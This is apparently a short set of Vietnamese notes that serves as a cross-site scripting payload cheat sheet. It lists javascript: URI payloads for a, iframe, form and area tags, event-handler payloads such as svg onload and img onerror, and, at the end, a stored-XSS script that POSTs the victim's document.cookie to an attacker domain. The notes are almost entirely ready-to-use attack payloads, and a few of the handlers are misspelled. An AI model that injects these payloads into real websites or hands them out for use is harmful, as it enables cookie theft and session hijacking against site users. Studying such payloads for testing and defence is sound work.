Payload:
 `javascript:alert("XSS")` thường được sử dụng cho jQuery và các thẻ 
- `<a href="javascript:alert("XSS")"></a>` 
- `<iframe src="javascript:alert("XSS")"></iframe>`
- `<form action="javascript:alert('XSS')"></form>`
- `<area href="javascript:alert('XSS')">`
Lưu ý: Đa số trình duyệt hiện nay đã chặn `javascript:` trong `src`, `href`, hoặc `action` ở nhiều thẻ, ngoại trừ một số thẻ như `<a>`, `<form>`

`onerror=alert("XSS)`, `onemouseover=alert("XSS")` được dùng cho các thẻ còn lại. Ví dụ như:
- `<svg onload=alert(1)>`
- `<img src=1 onerror=alert(1)`
- Các action có thể chèn vào thẻ input bao gồm: `onmouseover`, `onclick`, `onfocus`, ...


- Payload Stored XSS steal cookie từ victim gửi về trang của attacker
 ```
<script>
fetch('https://attacker-domain', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
